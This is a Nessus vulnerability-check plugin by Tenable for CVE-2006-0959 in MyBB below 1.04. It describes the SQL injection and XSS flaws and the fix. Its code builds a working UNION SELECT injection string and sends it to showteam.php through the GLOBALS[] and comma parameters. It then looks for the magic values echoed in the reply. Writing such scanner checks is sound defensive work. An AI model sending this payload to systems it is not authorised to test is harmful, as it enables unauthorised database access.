#
# (C) Tenable Network Security
#


if (description) {
  script_id(20930);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0959");
  script_bugtraq_id(16631);

  script_name(english:"MyBB < 1.04 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in MyBB < 1.04");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that is susceptible
to multiple flaws. 

Description :

The installed version of MyBB fails to validate user input to a large
number of parameters and scripts before using it in database queries
and dynamically-generated web pages.  If PHP's 'register_globals'
setting is enabled, an unauthenticated attacker may be able to
leverage these issues to conduct SQL injection and cross-site
scripting attacks against the affected application. 

See also :

http://www.securityfocus.com/archive/1/424942/30/0/threaded
http://community.mybboard.net/showthread.php?tid=6777
http://community.mybboard.net/showthread.php?tid=7368

Solution : 

Upgrade to MyBB version 1.1.0 or later. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("mybb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


magic1 = rand();
magic2 = rand();
exploit = string("%20UNION%20SELECT%20", magic1, ",", magic2);
for (i=1; i<=57; i++) exploit += ",null";
exploit += ",1,4/*";


# Test an install.
install = get_kb_item(string("www/", port, "/mybb"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit flaw.
  req = http_get(
    item:string(
      dir, "/showteam.php?",
      "GLOBALS[]=1&",
       "comma=-2)", exploit
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we see our magic numbers in the response.
  if (
    string("&amp;uid=", magic1, '">') >< res &&
    string("<b><i>", magic2, "</i></b>") >< res
  ) {
    security_warning(port);
    exit(0);
  }
}
